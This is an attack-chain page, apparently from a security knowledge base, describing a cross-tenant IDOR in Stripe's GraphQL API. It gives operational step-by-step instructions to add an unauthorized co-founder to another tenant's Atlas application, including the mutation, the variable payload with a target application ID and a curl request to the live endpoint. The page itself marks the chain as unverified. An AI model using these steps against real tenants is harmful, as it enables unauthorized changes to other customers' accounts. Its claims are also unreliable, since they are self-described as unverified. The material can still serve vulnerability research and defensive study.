---
tags:
  - idor
  - graphql
  - stripe
  - cross-tenant
  - unauthorized-access
  - data-manipulation
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Discover-IDOR-in-Stripe-GraphQL-API]]'
  - '[[procedures/Exploit-Cross-Tenant-IDOR-to-Add-Co-Founder]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Stored Data Manipulation]]'
updated_at: '2025-12-14T17:25:53.460Z'
description: >-
  An attack chain exploiting an Insecure Direct Object Reference (IDOR)
  vulnerability in Stripe's GraphQL API to gain unauthorized write access to
  another tenant's Atlas application data.
skill_level: intermediate
impact_level: high
id: c2026ce1-5cc5-44a1-9dbb-c3fc71d14d50
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Stored Data Manipulation]]'
---
# Cross-Tenant IDOR in Stripe GraphQL API for Unauthorized Atlas Application Modification

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in Stripe's GraphQL API, allowing an authenticated user with admin access to one tenant to modify another tenant's Stripe Atlas application by adding unauthorized co-founders. This compromises tenant isolation and could lead to account integrity issues or takeover scenarios.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover IDOR Vulnerability] --> B[Exploit Cross-Tenant Access]
    B --> C[Modify Target Application]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- GraphQL client (e.g., browser dev tools, Postman, or curl for sending mutations)

### Target Environment

- Stripe GraphQL API endpoint
- Stripe Atlas service
- Web platform with API access

### Initial Access Requirements

- Valid admin credentials for a Stripe merchant account
- Network access to Stripe's API (typically over HTTPS)
- Prior knowledge of target tenant's application IDs (e.g., via enumeration or guesswork)

## Detailed Attack Procedures

### Step 1: Discover IDOR Vulnerability
procedure: [[procedures/Discover-IDOR-in-Stripe-GraphQL-API]]

**Objective**: Identify the lack of authorization checks in the UpdateAtlasApplicationPerson GraphQL mutation, enabling cross-tenant object reference manipulation.

**Instructions**: Authenticate to the Stripe GraphQL API using your admin credentials. Inspect the UpdateAtlasApplicationPerson mutation schema to confirm it accepts application and person IDs without tenant-specific validation. Test with your own application's IDs to baseline normal behavior, then attempt to use IDs from another tenant (obtained via reconnaissance or known values).

**Expected Output**: Successful schema introspection revealing ID parameters; initial tests confirm mutation executes without errors on same-tenant IDs.

**Success Indicators**:
- Mutation schema shows direct ID inputs without authorization guards
- Baseline mutation succeeds on own tenant

### Step 2: Exploit Cross-Tenant Access
procedure: [[procedures/Exploit-Cross-Tenant-IDOR-to-Add-Co-Founder]]

**Objective**: Use the discovered IDOR to send a malicious GraphQL mutation that adds a co-founder to another tenant's Stripe Atlas application, achieving unauthorized write access.

**Instructions**: Construct a GraphQL mutation payload targeting the UpdateAtlasApplicationPerson operation. Replace the application ID with one from the target tenant and provide person details for the unauthorized co-founder. Send the mutation via an authenticated request from your admin session.

Example mutation structure (using JSON payload over HTTP POST to Stripe's GraphQL endpoint):

```graphql
mutation UpdateAtlasApplicationPerson($input: UpdateAtlasApplicationPersonInput!) {
  updateAtlasApplicationPerson(input: $input) {
    atlasApplication {
      id
    }
    person {
      id
    }
  }
}
```

With variables:

```json
{
  "input": {
    "atlasApplicationId": "target_tenant_app_id",
    "person": {
      "id": "your_controlled_person_id",
      "role": "CO_FOUNDER"
    }
  }
}
```

Submit via curl or GraphQL client:

```bash
curl -X POST https://api.stripe.com/graphql \
  -H "Authorization: Bearer sk_your_secret_key" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation...", "variables": {...}}'
```

**Expected Output**: API response confirming the update, with the target application's person list modified to include the added co-founder.

**Success Indicators**:
- API returns success without authorization errors
- Verification shows the co-founder added to the target tenant's application

## Attack Chain Summary

### Key Achievements

1. Identified IDOR in GraphQL mutation lacking tenant checks
2. Achieved cross-tenant write access to sensitive application data
3. Demonstrated potential for account compromise via unauthorized modifications

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Stored Data Manipulation]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
